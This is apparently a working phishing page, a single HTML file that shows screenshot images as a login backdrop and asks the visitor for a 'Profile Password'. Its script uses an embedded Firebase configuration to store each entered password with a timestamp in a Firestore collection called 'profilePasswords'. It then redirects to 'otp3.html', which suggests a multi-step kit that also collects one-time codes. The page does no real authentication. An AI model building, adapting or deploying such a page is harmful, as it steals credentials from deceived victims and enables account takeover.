<!DOCTYPE html>
<html lang="en">
<head>
  <title>dehijlbrd</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #FFFFFF;
      width: 98%;
      overflow-x: hidden;
    }

    img {
      width: 100%;
      max-width: 1000px;
      border-radius: 0px;
      margin-top: 10px;
    }

    .form-container {
      width: 90%;
      max-width: 400px;
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 0px rgba(0,0,0,0.1);
      margin: 0 auto;
    }

    .form-group {
      margin-bottom: 15px;
      text-align: left;
      position: relative;
    }

    label {
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
      color: #030303c0;
      font-size: 13px;
    }

    input[type="password"] {
      width: 96%;
      padding: 10px;
      background-color: #e5e5e5fa;
      border: 1px solid #aeaeae;
      border-radius: 0px;
      font-size: 12px;
      color: #333;
    }

    .submit-btn {
      margin-top: 20px;
      text-align: center;
    }

    .submit-btn a {
      background: #f09c19;
      color: #fff;
      font-size: 12px;
      font-weight: bold;
      padding: 8px 18px;
      text-align: center;
      border-radius: 6px;
      text-decoration: none;
      display: inline-block;
      transition: background 0.3s ease;
    }

    .submit-btn a:hover {
      background: #0f3f55;
    }

    .bottom-image {
      width: 105%;
      max-width: 2000px;
      border-radius: 0px;
      margin-top: 20px;
      display: block;
    }
  </style>
</head>
<body>

  <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">

  <div class="form-container">
    <form onsubmit="return submitProfilePassword(event)">
      <div class="form-group">
        <label for="profilePass">Enter Profile Password *</label>
        <input type="password" id="profilePass" name="profilePass" required>
      </div>

      <div class="submit-btn">
        <a href="#" onclick="submitIfValid()">Submit</a>
      </div>
    </form>

    <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
      authDomain: "dlhiljbrd.firebaseapp.com",
      projectId: "dlhiljbrd",
      storageBucket: "dlhiljbrd.firebasestorage.app",
      messagingSenderId: "981951131769",
      appId: "1:981951131769:web:6ba4d6bfa570ffa62664a8"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function submitIfValid() {
      const pass = document.getElementById("profilePass").value.trim();
      if (pass.length > 0) {
        db.collection("profilePasswords").add({
          password: pass,
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
        }).then(() => {
          window.location.href = "otp3.html";
        }).catch((error) => {
          alert("Error saving data: " + error.message);
        });
      } else {
        alert("Please enter your profile password.");
      }
    }

    function submitProfilePassword(e) {
      e.preventDefault();
      submitIfValid();
      return false;
    }
  </script>
</body>
</html>
